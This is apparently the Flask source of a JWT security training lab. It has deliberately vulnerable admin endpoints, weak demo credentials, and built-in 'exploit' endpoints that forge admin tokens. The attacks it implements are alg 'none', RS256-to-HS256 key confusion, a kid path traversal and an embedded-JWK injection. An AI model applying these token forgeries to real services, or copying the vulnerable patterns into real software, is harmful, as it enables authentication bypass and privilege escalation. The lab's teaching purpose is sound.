import base64
import hashlib
import hmac
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import jwt
from flask import Flask, jsonify, render_template, request

from app.key_material import KEY_DIR, ensure_key_material, read_task2_private_key, read_task2_public_key
from app.security import (
    AUDIENCE,
    ISSUER,
    AuthError,
    TASK1_HS256_SECRET,
    student_secure_decode_rs256,
    vulnerable_task1_decode,
    vulnerable_task2_decode,
    vulnerable_task3_decode,
    vulnerable_task4_decode,
)


app = Flask(__name__)
ensure_key_material()

USERS = {
    "alice": {"password": "password123", "role": "user"},
    "admin": {"password": "admin123", "role": "admin"},
}


def _request_credentials() -> tuple[str | None, str | None]:
    body = request.get_json(silent=True) or {}
    username = body.get("username") or request.form.get("username")
    password = body.get("password") or request.form.get("password")
    return username, password


def _authenticate() -> tuple[str, str]:
    username, password = _request_credentials()
    user = USERS.get(username or "")

    if not user or user["password"] != password:
        raise AuthError("invalid username or password")

    return username or "", user["role"]


def _claims(username: str, role: str, secure: bool = False) -> dict[str, object]:
    now = datetime.now(timezone.utc)
    claims: dict[str, object] = {
        "sub": username,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(minutes=30)).timestamp()),
    }

    if secure:
        claims["iss"] = ISSUER
        claims["aud"] = AUDIENCE

    return claims


def _bearer_token() -> str:
    auth_header = request.headers.get("Authorization", "")
    if not auth_header.startswith("Bearer "):
        raise AuthError("missing Authorization: Bearer <token> header")
    return auth_header.removeprefix("Bearer ").strip()


def _require_admin(payload: dict[str, object]) -> None:
    if payload.get("role") != "admin":
        raise AuthError("admin role required")


def _login_response(token: str) -> tuple[dict[str, str], int]:
    return {"token": token, "usage": "curl -H \"Authorization: Bearer <token>\" ..."}, 200


def _auth_error(exc: AuthError):
    return jsonify({"ok": False, "error": str(exc)}), 401


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode_segment(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _forge_hs256(header: dict, payload: dict, secret: bytes) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}"
    sig = hmac.new(secret, signing_input.encode("ascii"), hashlib.sha256).digest()
    return f"{signing_input}.{_b64url_encode(sig)}"


def _parse_token_body(token: str) -> tuple[dict, dict]:
    try:
        h_b64, p_b64, _ = token.split(".")
    except ValueError:
        raise ValueError("not a three-part JWT")
    header = json.loads(_b64url_decode_segment(h_b64))
    payload = json.loads(_b64url_decode_segment(p_b64))
    return header, payload


@app.get("/")
def index():
    return render_template("index.html")


@app.get("/health")
def health():
    return jsonify({"ok": True})


@app.post("/task1/login")
def task1_login():
    try:
        username, role = _authenticate()
    except AuthError as exc:
        return _auth_error(exc)

    token = jwt.encode(_claims(username, role), TASK1_HS256_SECRET, algorithm="HS256")
    return jsonify(_login_response(token)[0])


@app.get("/task1/admin")
def task1_admin():
    try:
        payload = vulnerable_task1_decode(_bearer_token())
        _require_admin(payload)
    except AuthError as exc:
        return _auth_error(exc)

    return jsonify({"ok": True, "task": 1, "message": "Task 1 admin access granted", "claims": payload})


@app.post("/task2/login")
def task2_login():
    try:
        username, role = _authenticate()
    except AuthError as exc:
        return _auth_error(exc)

    token = jwt.encode(_claims(username, role), read_task2_private_key(), algorithm="RS256", headers={"kid": "task2"})
    return jsonify(_login_response(token)[0])


@app.get("/task2/public.pem")
def task2_public_key():
    return read_task2_public_key(), 200, {"Content-Type": "text/plain; charset=utf-8"}


@app.get("/task2/admin")
def task2_admin():
    try:
        payload = vulnerable_task2_decode(_bearer_token())
        _require_admin(payload)
    except AuthError as exc:
        return _auth_error(exc)

    return jsonify({"ok": True, "task": 2, "message": "Task 2 admin access granted", "claims": payload})


@app.post("/task3/login")
def task3_login():
    try:
        username, role = _authenticate()
    except AuthError as exc:
        return _auth_error(exc)

    secret = (KEY_DIR / "task3-default.key").read_bytes()
    token = jwt.encode(_claims(username, role), secret, algorithm="HS256", headers={"kid": "task3-default.key"})
    return jsonify(_login_response(token)[0])


@app.get("/task3/admin")
def task3_admin():
    try:
        payload = vulnerable_task3_decode(_bearer_token())
        _require_admin(payload)
    except AuthError as exc:
        return _auth_error(exc)

    return jsonify({"ok": True, "task": 3, "message": "Task 3 admin access granted", "claims": payload})


@app.post("/task4/login")
def task4_login():
    try:
        username, role = _authenticate()
    except AuthError as exc:
        return _auth_error(exc)

    token = jwt.encode(_claims(username, role), read_task2_private_key(), algorithm="RS256", headers={"kid": "task4"})
    return jsonify(_login_response(token)[0])


@app.get("/task4/admin")
def task4_admin():
    try:
        payload = vulnerable_task4_decode(_bearer_token())
        _require_admin(payload)
    except AuthError as exc:
        return _auth_error(exc)

    return jsonify({"ok": True, "task": 4, "message": "Task 4 admin access granted", "claims": payload})


@app.post("/fixed/login")
def fixed_login():
    try:
        username, role = _authenticate()
    except AuthError as exc:
        return _auth_error(exc)

    token = jwt.encode(
        _claims(username, role, secure=True),
        read_task2_private_key(),
        algorithm="RS256",
        headers={"kid": "task2"},
    )
    return jsonify(_login_response(token)[0])


@app.get("/fixed/admin")
def fixed_admin():
    try:
        payload = student_secure_decode_rs256(_bearer_token())
        _require_admin(payload)
    except AuthError as exc:
        return _auth_error(exc)

    return jsonify({"ok": True, "task": "fixed", "message": "Secure admin access granted", "claims": payload})


@app.post("/task3/write-attacker-key")
def task3_write_attacker_key():
    path = Path("/tmp/jwt-lab/attacker.key")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("student-controlled-secret", encoding="utf-8")
    return jsonify({"ok": True, "path": str(path)})


# ── UI exploit endpoints ──────────────────────────────────────────

@app.post("/api/exploit/task1")
def api_exploit_task1():
    token = (request.get_json(silent=True) or {}).get("token", "")
    try:
        header, payload = _parse_token_body(token)
    except (ValueError, Exception) as exc:
        return jsonify({"error": str(exc)}), 400
    header["alg"] = "none"
    header.pop("kid", None)
    payload["role"] = "admin"
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return jsonify({"forged_token": f"{h}.{p}."})


@app.post("/api/exploit/task2")
def api_exploit_task2():
    token = (request.get_json(silent=True) or {}).get("token", "")
    try:
        header, payload = _parse_token_body(token)
    except (ValueError, Exception) as exc:
        return jsonify({"error": str(exc)}), 400
    header["alg"] = "HS256"
    header["kid"] = "task2"
    payload["role"] = "admin"
    secret = read_task2_public_key().encode("utf-8")
    return jsonify({"forged_token": _forge_hs256(header, payload, secret)})


_ATTACKER_SECRET = b"student-controlled-secret"
_TRAVERSAL_KID = "../../../tmp/jwt-lab/attacker.key"


@app.post("/api/exploit/task4")
def api_exploit_task4():
    from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
    from jwt.algorithms import RSAAlgorithm

    token = (request.get_json(silent=True) or {}).get("token", "")
    try:
        _, payload = _parse_token_body(token)
    except (ValueError, Exception) as exc:
        return jsonify({"error": str(exc)}), 400

    private_key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
    jwk = json.loads(RSAAlgorithm.to_jwk(private_key.public_key()))
    payload["role"] = "admin"
    forged = jwt.encode(payload, private_key, algorithm="RS256", headers={"jwk": jwk, "kid": "task4"})
    return jsonify({"forged_token": forged})


@app.post("/api/exploit/task3")
def api_exploit_task3():
    attacker_key = Path("/tmp/jwt-lab/attacker.key")
    attacker_key.parent.mkdir(parents=True, exist_ok=True)
    attacker_key.write_text(_ATTACKER_SECRET.decode(), encoding="utf-8")

    token = (request.get_json(silent=True) or {}).get("token", "")
    try:
        header, payload = _parse_token_body(token)
    except (ValueError, Exception) as exc:
        return jsonify({"error": str(exc)}), 400
    header["alg"] = "HS256"
    header["kid"] = _TRAVERSAL_KID
    payload["role"] = "admin"
    return jsonify({"forged_token": _forge_hs256(header, payload, _ATTACKER_SECRET)})
